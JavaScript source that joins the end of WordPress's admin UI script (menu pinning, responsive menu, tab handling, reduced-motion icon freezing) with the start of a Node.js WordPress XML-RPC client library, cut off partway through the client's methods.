	$( 'tbody' ).on( 'click', '.toggle-row', function() {
		$( this ).closest( 'tr' ).toggleClass( 'is-expanded' );
	});

	$('#default-password-nag-no').on( 'click', function() {
		setUserSetting('default_password_nag', 'hide');
		$('div.default-password-nag').hide();
		return false;
	});

	/**
	 * Handles tab keypresses in theme and plugin file editor textareas.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$('#newcontent').on('keydown.wpevent_InsertTab', function(e) {
		var el = e.target, selStart, selEnd, val, scroll, sel;

		// After pressing escape key (keyCode: 27), the tab key should tab out of the textarea.
		if ( e.keyCode == 27 ) {
			// When pressing Escape: Opera 12 and 27 blur form fields, IE 8 clears them.
			e.preventDefault();
			$(el).data('tab-out', true);
			return;
		}

		// Only listen for plain tab key (keyCode: 9) without any modifiers.
		if ( e.keyCode != 9 || e.ctrlKey || e.altKey || e.shiftKey )
			return;

		// After tabbing out, reset it so next time the tab key can be used again.
		if ( $(el).data('tab-out') ) {
			$(el).data('tab-out', false);
			return;
		}

		selStart = el.selectionStart;
		selEnd = el.selectionEnd;
		val = el.value;

		// If any text is selected, replace the selection with a tab character.
		if ( document.selection ) {
			el.focus();
			sel = document.selection.createRange();
			sel.text = '\t';
		} else if ( selStart >= 0 ) {
			scroll = this.scrollTop;
			el.value = val.substring(0, selStart).concat('\t', val.substring(selEnd) );
			el.selectionStart = el.selectionEnd = selStart + 1;
			this.scrollTop = scroll;
		}

		// Cancel the regular tab functionality, to prevent losing focus of the textarea.
		if ( e.stopPropagation )
			e.stopPropagation();
		if ( e.preventDefault )
			e.preventDefault();
	});

	// Reset page number variable for new filters/searches but not for bulk actions. See #17685.
	if ( pageInput.length ) {

		/**
		 * Handles pagination variable when filtering the list table.
		 *
		 * Set the pagination argument to the first page when the post-filter form is submitted.
		 * This happens when pressing the 'filter' button on the list table page.
		 *
		 * The pagination argument should not be touched when the bulk action dropdowns are set to do anything.
		 *
		 * The form closest to the pageInput is the post-filter form.
		 *
		 * @return {void}
		 */
		pageInput.closest('form').on( 'submit', function() {
			/*
			 * action = bulk action dropdown at the top of the table
			 */
			if ( $('select[name="action"]').val() == -1 && pageInput.val() == currentPage )
				pageInput.val('1');
		});
	}

	/**
	 * Resets the bulk actions when the search button is clicked.
	 *
	 * @return {void}
	 */
	$('.search-box input[type="search"], .search-box input[type="submit"]').on( 'mousedown', function () {
		$('select[name^="action"]').val('-1');
	});

	/**
	 * Scrolls into view when focus.scroll-into-view is triggered.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
 	 */
	$('#contextual-help-link, #show-settings-link').on( 'focus.scroll-into-view', function(e){
		if ( e.target.scrollIntoViewIfNeeded )
			e.target.scrollIntoViewIfNeeded(false);
	});

	/**
	 * Disables the submit upload buttons when no data is entered.
	 *
	 * @return {void}
	 */
	(function(){
		var button, input, form = $('form.wp-upload-form');

		// Exit when no upload form is found.
		if ( ! form.length )
			return;

		button = form.find('input[type="submit"]');
		input = form.find('input[type="file"]');

		/**
		 * Determines if any data is entered in any file upload input.
		 *
		 * @since 3.5.0
		 *
		 * @return {void}
		 */
		function toggleUploadButton() {
			// When no inputs have a value, disable the upload buttons.
			button.prop('disabled', '' === input.map( function() {
				return $(this).val();
			}).get().join(''));
		}

		// Update the status initially.
		toggleUploadButton();
		// Update the status when any file input changes.
		input.on('change', toggleUploadButton);
	})();

	/**
	 * Pins the menu while distraction-free writing is enabled.
	 *
	 * @param {Event} event Event data.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function pinMenu( event ) {
		var windowPos = $window.scrollTop(),
			resizing = ! event || event.type !== 'scroll';

		if ( isIOS || $adminmenu.data( 'wp-responsive' ) ) {
			return;
		}

		/*
		 * When the menu is higher than the window and smaller than the entire page.
		 * It should be adjusted to be able to see the entire menu.
		 *
		 * Otherwise it can be accessed normally.
		 */
		if ( height.menu + height.adminbar < height.window ||
			height.menu + height.adminbar + 20 > height.wpwrap ) {
			unpinMenu();
			return;
		}

		menuIsPinned = true;

		// If the menu is higher than the window, compensate on scroll.
		if ( height.menu + height.adminbar > height.window ) {
			// Check for overscrolling, this happens when swiping up at the top of the document in modern browsers.
			if ( windowPos < 0 ) {
				// Stick the menu to the top.
				if ( ! pinnedMenuTop ) {
					pinnedMenuTop = true;
					pinnedMenuBottom = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}

				return;
			} else if ( windowPos + height.window > $document.height() - 1 ) {
				// When overscrolling at the bottom, stick the menu to the bottom.
				if ( ! pinnedMenuBottom ) {
					pinnedMenuBottom = true;
					pinnedMenuTop = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}

				return;
			}

			if ( windowPos > lastScrollPosition ) {
				// When a down scroll has been detected.

				// If it was pinned to the top, unpin and calculate relative scroll.
				if ( pinnedMenuTop ) {
					pinnedMenuTop = false;
					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar - ( windowPos - lastScrollPosition );

					if ( menuTop + height.menu + height.adminbar < windowPos + height.window ) {
						menuTop = windowPos + height.window - height.menu - height.adminbar;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuBottom && $adminMenuWrap.offset().top + height.menu < windowPos + height.window ) {
					// Pin it to the bottom.
					pinnedMenuBottom = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}
			} else if ( windowPos < lastScrollPosition ) {
				// When a scroll up is detected.

				// If it was pinned to the bottom, unpin and calculate relative scroll.
				if ( pinnedMenuBottom ) {
					pinnedMenuBottom = false;

					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar + ( lastScrollPosition - windowPos );

					if ( menuTop + height.menu > windowPos + height.window ) {
						menuTop = windowPos;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuTop && $adminMenuWrap.offset().top >= windowPos + height.adminbar ) {

					// Pin it to the top.
					pinnedMenuTop = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}
			} else if ( resizing ) {
				// Window is being resized.

				pinnedMenuTop = pinnedMenuBottom = false;

				// Calculate the new offset.
				menuTop = windowPos + height.window - height.menu - height.adminbar - 1;

				if ( menuTop > 0 ) {
					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else {
					unpinMenu();
				}
			}
		}

		lastScrollPosition = windowPos;
	}

	/**
	 * Determines the height of certain elements.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function resetHeights() {
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		};
	}

	/**
	 * Unpins the menu.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function unpinMenu() {
		if ( isIOS || ! menuIsPinned ) {
			return;
		}

		pinnedMenuTop = pinnedMenuBottom = menuIsPinned = false;
		$adminMenuWrap.css({
			position: '',
			top: '',
			bottom: ''
		});
	}

	/**
	 * Pins and unpins the menu when applicable.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function setPinMenu() {
		resetHeights();

		if ( $adminmenu.data('wp-responsive') ) {
			$body.removeClass( 'sticky-menu' );
			unpinMenu();
		} else if ( height.menu + height.adminbar > height.window ) {
			pinMenu();
			$body.removeClass( 'sticky-menu' );
		} else {
			$body.addClass( 'sticky-menu' );
			unpinMenu();
		}
	}

	if ( ! isIOS ) {
		$window.on( 'scroll.pin-menu', pinMenu );
		$document.on( 'tinymce-editor-init.pin-menu', function( event, editor ) {
			editor.on( 'wp-autoresize', resetHeights );
		});
	}

	/**
	 * Changes the sortables and responsiveness of metaboxes.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	window.wpResponsive = {

		/**
		 * Initializes the wpResponsive object.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		init: function() {
			var self = this;

			this.maybeDisableSortables = this.maybeDisableSortables.bind( this );

			// Modify functionality based on custom activate/deactivate event.
			$document.on( 'wp-responsive-activate.wp-responsive', function() {
				self.activate();
				self.toggleAriaHasPopup( 'add' );
			}).on( 'wp-responsive-deactivate.wp-responsive', function() {
				self.deactivate();
				self.toggleAriaHasPopup( 'remove' );
			});

			$( '#wp-admin-bar-menu-toggle a' ).attr( 'aria-expanded', 'false' );

			// Toggle sidebar when toggle is clicked.
			$( '#wp-admin-bar-menu-toggle' ).on( 'click.wp-responsive', function( event ) {
				event.preventDefault();

				// Close any open toolbar submenus.
				$adminbar.find( '.hover' ).removeClass( 'hover' );

				$wpwrap.toggleClass( 'wp-responsive-open' );
				if ( $wpwrap.hasClass( 'wp-responsive-open' ) ) {
					$(this).find('a').attr( 'aria-expanded', 'true' );
					$( '#adminmenu a:first' ).trigger( 'focus' );
				} else {
					$(this).find('a').attr( 'aria-expanded', 'false' );
				}
			} );

			// Close sidebar when target moves outside of toggle and sidebar.
			$( document ).on( 'click', function( event ) {
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) || ! document.hasFocus() ) {
					return;
				}

				var focusIsInToggle  = $.contains( $( '#wp-admin-bar-menu-toggle' )[0], event.target );
				var focusIsInSidebar = $.contains( $( '#adminmenuwrap' )[0], event.target );

				if ( ! focusIsInToggle && ! focusIsInSidebar ) {
					$( '#wp-admin-bar-menu-toggle' ).trigger( 'click.wp-responsive' );
				}
			} );

			// Close sidebar when a keypress completes outside of toggle and sidebar.
			$( document ).on( 'keyup', function( event ) {
				var toggleButton   = $( '#wp-admin-bar-menu-toggle' )[0];
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) ) {
				    return;
				}
				if ( 27 === event.keyCode ) {
					$( toggleButton ).trigger( 'click.wp-responsive' );
					$( toggleButton ).find( 'a' ).trigger( 'focus' );
				} else {
					if ( 9 === event.keyCode ) {
						var sidebar        = $( '#adminmenuwrap' )[0];
						var focusedElement = event.relatedTarget || document.activeElement;
						// A brief delay is required to allow focus to switch to another element.
						setTimeout( function() {
							var focusIsInToggle  = $.contains( toggleButton, focusedElement );
							var focusIsInSidebar = $.contains( sidebar, focusedElement );

							if ( ! focusIsInToggle && ! focusIsInSidebar ) {
								$( toggleButton ).trigger( 'click.wp-responsive' );
							}
						}, 10 );
					}
				}
			});

			// Add menu events.
			$adminmenu.on( 'click.wp-responsive', 'li.wp-has-submenu > a', function( event ) {
				if ( ! $adminmenu.data('wp-responsive') ) {
					return;
				}
				let state = ( 'false' === $( this ).attr( 'aria-expanded' ) ) ? 'true' : 'false';
				$( this ).parent( 'li' ).toggleClass( 'selected' );
				$( this ).attr( 'aria-expanded', state );
				$( this ).trigger( 'focus' );
				event.preventDefault();
			});

			self.trigger();
			$document.on( 'wp-window-resized.wp-responsive', this.trigger.bind( this ) );

			// This needs to run later as UI Sortable may be initialized when the document is ready.
			$window.on( 'load.wp-responsive', this.maybeDisableSortables );
			$document.on( 'postbox-toggled', this.maybeDisableSortables );

			// When the screen columns are changed, potentially disable sortables.
			$( '#screen-options-wrap input' ).on( 'click', this.maybeDisableSortables );
		},

		/**
		 * Disable sortables if there is only one metabox, or the screen is in one column mode. Otherwise, enable sortables.
		 *
		 * @since 5.3.0
		 *
		 * @return {void}
		 */
		maybeDisableSortables: function() {
			var width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? $window.width() : window.innerWidth;

			if (
				( width <= 782 ) ||
				( 1 >= $sortables.find( '.ui-sortable-handle:visible' ).length && jQuery( '.columns-prefs-1 input' ).prop( 'checked' ) )
			) {
				this.disableSortables();
			} else {
				this.enableSortables();
			}
		},

		/**
		 * Changes properties of body and admin menu.
		 *
		 * Pins and unpins the menu and adds the auto-fold class to the body.
		 * Makes the admin menu responsive and disables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		activate: function() {
			setPinMenu();

			if ( ! $body.hasClass( 'auto-fold' ) ) {
				$body.addClass( 'auto-fold' );
			}

			$adminmenu.data( 'wp-responsive', 1 );
			this.disableSortables();
		},

		/**
		 * Changes properties of admin menu and enables metabox sortables.
		 *
		 * Pin and unpin the menu.
		 * Removes the responsiveness of the admin menu and enables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		deactivate: function() {
			setPinMenu();
			$adminmenu.removeData('wp-responsive');

			this.maybeDisableSortables();
		},

		/**
		 * Toggles the aria-haspopup attribute for the responsive admin menu.
		 *
		 * The aria-haspopup attribute is only necessary for the responsive menu.
		 * See ticket https://core.trac.wordpress.org/ticket/43095
		 *
		 * @since 6.6.0
		 *
		 * @param {string} action Whether to add or remove the aria-haspopup attribute.
		 *
		 * @return {void}
		 */
		toggleAriaHasPopup: function( action ) {
			var elements = $adminmenu.find( '[data-ariahaspopup]' );

			if ( action === 'add' ) {
				elements.each( function() {
					$( this ).attr( 'aria-haspopup', 'menu' ).attr( 'aria-expanded', 'false' );
				} );

				return;
			}

			elements.each( function() {
				$( this ).removeAttr( 'aria-haspopup' ).removeAttr( 'aria-expanded' );
			} );
		},

		/**
		 * Sets the responsiveness and enables the overlay based on the viewport width.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		trigger: function() {
			var viewportWidth = getViewportWidth();

			// Exclude IE < 9, it doesn't support @media CSS rules.
			if ( ! viewportWidth ) {
				return;
			}

			if ( viewportWidth <= 782 ) {
				if ( ! wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-activate' );
					wpResponsiveActive = true;
				}
			} else {
				if ( wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-deactivate' );
					wpResponsiveActive = false;
				}
			}

			if ( viewportWidth <= 480 ) {
				this.enableOverlay();
			} else {
				this.disableOverlay();
			}

			this.maybeDisableSortables();
		},

		/**
		 * Inserts a responsive overlay and toggles the window.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableOverlay: function() {
			if ( $overlay.length === 0 ) {
				$overlay = $( '<div id="wp-responsive-overlay"></div>' )
					.insertAfter( '#wpcontent' )
					.hide()
					.on( 'click.wp-responsive', function() {
						$toolbar.find( '.menupop.hover' ).removeClass( 'hover' );
						$( this ).hide();
					});
			}

			$toolbarPopups.on( 'click.wp-responsive', function() {
				$overlay.show();
			});
		},

		/**
		 * Disables the responsive overlay and removes the overlay.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableOverlay: function() {
			$toolbarPopups.off( 'click.wp-responsive' );
			$overlay.hide();
		},

		/**
		 * Disables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'disable' );
					$sortables.find( '.ui-sortable-handle' ).addClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		},

		/**
		 * Enables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'enable' );
					$sortables.find( '.ui-sortable-handle' ).removeClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		}
	};

	/**
	 * Add an ARIA role `button` to elements that behave like UI controls when JavaScript is on.
	 *
	 * @since 4.5.0
	 *
	 * @return {void}
	 */
	function aria_button_if_js() {
		$( '.aria-button-if-js' ).attr( 'role', 'button' );
	}

	$( document ).on( 'ajaxComplete', function() {
		aria_button_if_js();
	});

	/**
	 * Get the viewport width.
	 *
	 * @since 4.7.0
	 *
	 * @return {number|boolean} The current viewport width or false if the
	 *                          browser doesn't support innerWidth (IE < 9).
	 */
	function getViewportWidth() {
		var viewportWidth = false;

		if ( window.innerWidth ) {
			// On phones, window.innerWidth is affected by zooming.
			viewportWidth = Math.max( window.innerWidth, document.documentElement.clientWidth );
		}

		return viewportWidth;
	}

	/**
	 * Sets the admin menu collapsed/expanded state.
	 *
	 * Sets the global variable `menuState` and triggers a custom event passing
	 * the current menu state.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	function setMenuState() {
		var viewportWidth = getViewportWidth() || 961;

		if ( viewportWidth <= 782  ) {
			menuState = 'responsive';
		} else if ( $body.hasClass( 'folded' ) || ( $body.hasClass( 'auto-fold' ) && viewportWidth <= 960 && viewportWidth > 782 ) ) {
			menuState = 'folded';
		} else {
			menuState = 'open';
		}

		$document.trigger( 'wp-menu-state-set', { state: menuState } );
	}

	// Set the menu state when the window gets resized.
	$document.on( 'wp-window-resized.set-menu-state', setMenuState );

	/**
	 * Sets ARIA attributes on the collapse/expand menu button.
	 *
	 * When the admin menu is open or folded, updates the `aria-expanded` and
	 * `aria-label` attributes of the button to give feedback to assistive
	 * technologies. In the responsive view, the button is always hidden.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	$document.on( 'wp-menu-state-set wp-collapse-menu', function( event, eventData ) {
		var $collapseButton = $( '#collapse-button' ),
			ariaExpanded, ariaLabelText;

		if ( 'folded' === eventData.state ) {
			ariaExpanded = 'false';
			ariaLabelText = __( 'Expand Main menu' );
		} else {
			ariaExpanded = 'true';
			ariaLabelText = __( 'Collapse Main menu' );
		}

		$collapseButton.attr({
			'aria-expanded': ariaExpanded,
			'aria-label': ariaLabelText
		});
	});

	window.wpResponsive.init();
	setPinMenu();
	setMenuState();
	makeNoticesDismissible();
	aria_button_if_js();

	$document.on( 'wp-pin-menu wp-window-resized.pin-menu postboxes-columnchange.pin-menu postbox-toggled.pin-menu wp-collapse-menu.pin-menu wp-scroll-start.pin-menu', setPinMenu );

	// Set initial focus on a specific element.
	$( '.wp-initial-focus' ).trigger( 'focus' );

	// Toggle update details on update-core.php.
	$body.on( 'click', '.js-update-details-toggle', function() {
		var $updateNotice = $( this ).closest( '.js-update-details' ),
			$progressDiv = $( '#' + $updateNotice.data( 'update-details' ) );

		/*
		 * When clicking on "Show details" move the progress div below the update
		 * notice. Make sure it gets moved just the first time.
		 */
		if ( ! $progressDiv.hasClass( 'update-details-moved' ) ) {
			$progressDiv.insertAfter( $updateNotice ).addClass( 'update-details-moved' );
		}

		// Toggle the progress div visibility.
		$progressDiv.toggle();
		// Toggle the Show Details button expanded state.
		$( this ).attr( 'aria-expanded', $progressDiv.is( ':visible' ) );
	});
});

/**
 * Hides the update button for expired plugin or theme uploads.
 *
 * On the "Update plugin/theme from uploaded zip" screen, once the upload has expired,
 * hides the "Replace current with uploaded" button and displays a warning.
 *
 * @since 5.5.0
 */
$( function( $ ) {
	var $overwrite, $warning;

	if ( ! $body.hasClass( 'update-php' ) ) {
		return;
	}

	$overwrite = $( 'a.update-from-upload-overwrite' );
	$warning   = $( '.update-from-upload-expired' );

	if ( ! $overwrite.length || ! $warning.length ) {
		return;
	}

	window.setTimeout(
		function() {
			$overwrite.hide();
			$warning.removeClass( 'hidden' );

			if ( window.wp && window.wp.a11y ) {
				window.wp.a11y.speak( $warning.text() );
			}
		},
		7140000 // 119 minutes. The uploaded file is deleted after 2 hours.
	);
} );

// Fire a custom jQuery event at the end of window resize.
( function() {
	var timeout;

	/**
	 * Triggers the WP window-resize event.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function triggerEvent() {
		$document.trigger( 'wp-window-resized' );
	}

	/**
	 * Fires the trigger event again after 200 ms.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function fireOnce() {
		window.clearTimeout( timeout );
		timeout = window.setTimeout( triggerEvent, 200 );
	}

	$window.on( 'resize.wp-fire-once', fireOnce );
}());

// Make Windows 8 devices play along nicely.
(function(){
	if ( '-ms-user-select' in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/) ) {
		var msViewportStyle = document.createElement( 'style' );
		msViewportStyle.appendChild(
			document.createTextNode( '@-ms-viewport{width:auto!important}' )
		);
		document.getElementsByTagName( 'head' )[0].appendChild( msViewportStyle );
	}
})();

}( jQuery, window ));

/**
 * Freeze animated plugin icons when reduced motion is enabled.
 *
 * When the user has enabled the 'prefers-reduced-motion' setting, this module
 * stops animations for all GIFs on the page with the class 'plugin-icon' or
 * plugin icon images in the update plugins table.
 *
 * @since 6.4.0
 */
(function() {
	// Private variables and methods.
	var priv = {},
		pub = {},
		mediaQuery;

	// Initialize pauseAll to false; it will be set to true if reduced motion is preferred.
	priv.pauseAll = false;
	if ( window.matchMedia ) {
		mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
		if ( ! mediaQuery || mediaQuery.matches ) {
			priv.pauseAll = true;
		}
	}

	// Method to replace animated GIFs with a static frame.
	priv.freezeAnimatedPluginIcons = function( img ) {
		var coverImage = function() {
			var width = img.width;
			var height = img.height;
			var canvas = document.createElement( 'canvas' );

			// Set canvas dimensions.
			canvas.width = width;
			canvas.height = height;

			// Copy classes from the image to the canvas.
			canvas.className = img.className;

			// Check if the image is inside a specific table.
			var isInsideUpdateTable = img.closest( '#update-plugins-table' );

			if ( isInsideUpdateTable ) {
				// Transfer computed styles from image to canvas.
				var computedStyles = window.getComputedStyle( img ),
					i, max;
				for ( i = 0, max = computedStyles.length; i < max; i++ ) {
					var propName = computedStyles[ i ];
					var propValue = computedStyles.getPropertyValue( propName );
					canvas.style[ propName ] = propValue;
				}
			}

			// Draw the image onto the canvas.
			canvas.getContext( '2d' ).drawImage( img, 0, 0, width, height );

			// Set accessibility attributes on canvas.
			canvas.setAttribute( 'aria-hidden', 'true' );
			canvas.setAttribute( 'role', 'presentation' );

			// Insert canvas before the image and set the image to be near-invisible.
			var parent = img.parentNode;
			parent.insertBefore( canvas, img );
			img.style.opacity = 0.01;
			img.style.width = '0px';
			img.style.height = '0px';
		};

		// If the image is already loaded, apply the coverImage function.
		if ( img.complete ) {
			coverImage();
		} else {
			// Otherwise, wait for the image to load.
			img.addEventListener( 'load', coverImage, true );
		}
	};

	// Public method to freeze all relevant GIFs on the page.
	pub.freezeAll = function() {
		var images = document.querySelectorAll( '.plugin-icon, #update-plugins-table img' );
		for ( var x = 0; x < images.length; x++ ) {
			if ( /\.gif(?:\?|$)/i.test( images[ x ].src ) ) {
				priv.freezeAnimatedPluginIcons( images[ x ] );
			}
		}
	};

	// Only run the freezeAll method if the user prefers reduced motion.
	if ( true === priv.pauseAll ) {
		pub.freezeAll();
	}

	// Listen for jQuery AJAX events.
	( function( $ ) {
		if ( window.pagenow === 'plugin-install' ) {
			// Only listen for ajaxComplete if this is the plugin-install.php page.
			$( document ).ajaxComplete( function( event, xhr, settings ) {

				// Check if this is the 'search-install-plugins' request.
				if ( settings.data && typeof settings.data === 'string' && settings.data.includes( 'action=search-install-plugins' ) ) {
					// Recheck if the user prefers reduced motion.
					if ( window.matchMedia ) {
						var mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
						if ( mediaQuery.matches ) {
							pub.freezeAll();
						}
					} else {
						// Fallback for browsers that don't support matchMedia.
						if ( true === priv.pauseAll ) {
							pub.freezeAll();
						}
					}
				}
			} );
		}
	} )( jQuery );

	// Expose public methods.
	return pub;
})();
// http://codex.wordpress.org/XML-RPC_Support
// http://codex.wordpress.org/XML-RPC_WordPress_API

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function parseArguments( args ) {
	return [].slice.call( args, 1 )

		// Remove null arguments
		// Null values only exist for optional fields. As of WordPress 4.4,
		// null is no longer treated the same as omitting the value. To
		// compensate for this, we just drop the argument before calling
		// into WordPress. See #25.
		.filter(function( value ) {
			return value !== null;
		});
}

function Client( settings ) {
	[ "url", "username", "password" ].forEach(function( prop ) {
		if ( !settings[prop] ) {
			throw new Error( "Missing required setting: " + prop );
		}
	});

	var parsedUrl = Client.parseUrl( settings.url );
	this.rpc = xmlrpc[ parsedUrl.secure ? "createSecureClient" : "createClient" ]({
		host: settings.host || parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		rejectUnauthorized: settings.rejectUnauthorized !== undefined ? settings.rejectUnauthorized : true,
		servername: settings.host || parsedUrl.host,

		// Always set Host header in case we're pointing to a different server
		// via settings.host
		headers: {
			Host: parsedUrl.host
		},
		basic_auth: !settings.basicAuth ? null : {
			user: settings.basicAuth.username,
			pass: settings.basicAuth.password
		}
	});
	this.blogId = settings.blogId || 0;
	this.username = settings.username;
	this.password = settings.password;
}

Client.parseUrl = function( wpUrl ) {
	var urlParts, secure;

	// allow URLs without a protocol
	if ( !(/\w+:\/\//.test( wpUrl ) ) ) {
		wpUrl = "http://" + wpUrl;
	}
	urlParts = url.parse( wpUrl );
	secure = urlParts.protocol === "https:";

	return {
		host: urlParts.hostname,
		port: urlParts.port || (secure ? 443 : 80),
		path: urlParts.path.replace( /\/+$/, "" ) + "/xmlrpc.php",
		secure: secure
	};
};

extend( Client.prototype, {
	call: function( method ) {
		var args = parseArguments( arguments ),
			fn = args.pop();

		if ( typeof fn !== "function" ) {
			args.push( fn );
			fn = null;
		}

		this.rpc.methodCall( method, args, function( error, data ) {
			if ( !error ) {
				return fn( null, data );
			}

			if ( error.code === "ENOTFOUND" && error.syscall === "getaddrinfo" ) {
				error.message = "Unable to connect to WordPress.";
			} else if ( error.message === "Unknown XML-RPC tag 'TITLE'" ) {
				var additional = error.res.statusCode;
				if (error.res.statusMessage) {
					additional += "; " + error.res.statusMessage;
				}

				error.message = "(" + additional + ") " + error.message;
			}

			fn( error );
		});
	},

	authenticatedCall: function() {
		var args = [].slice.call( arguments );
		args.splice( 1, 0, this.blogId, this.username, this.password );
		this.call.apply( this, args );
	},

	listMethods: function( fn ) {
		this.call( "system.listMethods", fn );
	}
});

extend( Client.prototype, {
	getPost: function( id, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPost", id, fields, function( error, post ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( post, "post" ) );
		});
	},

	getPosts: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( filter.type ) {
			filter.post_type = filter.type;
			delete filter.type;
		}

		if ( filter.status ) {
			filter.post_status = filter.status;
			delete filter.status;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "post" )[ 0 ];
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPosts", filter, fields, function( error, posts ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, posts.map(function( post ) {
				return fieldMap.from( post, "post" );
			}));
		});
	},

	newPost: function( data, fn ) {
		this.authenticatedCall( "wp.newPost", fieldMap.to( data, "post" ), fn );
	},

	// to remove a term, just set the terms and leave out the id that you want to remove
	// to remove a custom field, pass the id with no key or value
	editPost: function( id, data, fn ) {
		this.authenticatedCall( "wp.editPost", id, fieldMap.to( data, "post" ), fn );
	},

	deletePost: function( id, fn ) {
		this.authenticatedCall( "wp.deletePost", id, fn );
	},

	getPostType: function( name, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostType", name, fields, function( error, postType ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( postType, "postType" ) );
		});
	},

	getPostTypes: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( Array.isArray(filter) ) {
			fields = filter;
			filter = {};
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostTypes", filter, fields, function( error, postTypes ) {
			if ( error ) {
				return fn( error );
			}

			Object.keys( postTypes ).forEach(function( postType ) {
				postTypes[ postType ] = fieldMap.from( postTypes[ postType ], "postType" );
			});
			fn( null, postTypes );
		});
	}
});

extend( Client.prototype, {
	getTaxonomy: function( name, fn ) {
		this.authenticatedCall( "wp.getTaxonomy", name, function( error, taxonomy ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( taxonomy, "taxonomy" ) );
		});
	},

	getTaxonomies: function( fn ) {
		this.authenticatedCall( "wp.getTaxonomies", function( error, taxonomies ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, taxonomies.map(function( taxonomy ) {
				return fieldMap.from( taxonomy, "taxonomy" );
			}));
		});
	},

	getTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.getTerm", taxonomy, id, function( error, term ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( term, "term" ) );
		});
	},

	getTerms: function( taxonomy, filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		if ( filter.hideEmpty ) {
			filter.hide_empty = filter.hideEmpty;
			delete filter.hideEmpty;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "term" )[ 0 ];
		}

		this.authenticatedCall( "wp.getTerms", taxonomy, filter, function( error, terms ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, terms.map(function( term ) {
				return fieldMap.from( term, "term" );
			}));
		});
	},

	newTerm: function( data, fn ) {
		this.authenticatedCall( "wp.newTerm", fieldMap.to( data, "term" ), fn );
	},

	editTerm: function( id, data, fn ) {
		this.authenticatedCall( "wp.editTerm", id, fieldMap.to( data, "term" ), fn );
	},

	deleteTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.deleteTerm", taxonomy, id, fn );
	}
});

extend( Client.prototype, {
	getMediaItem: function( id, fn ) {
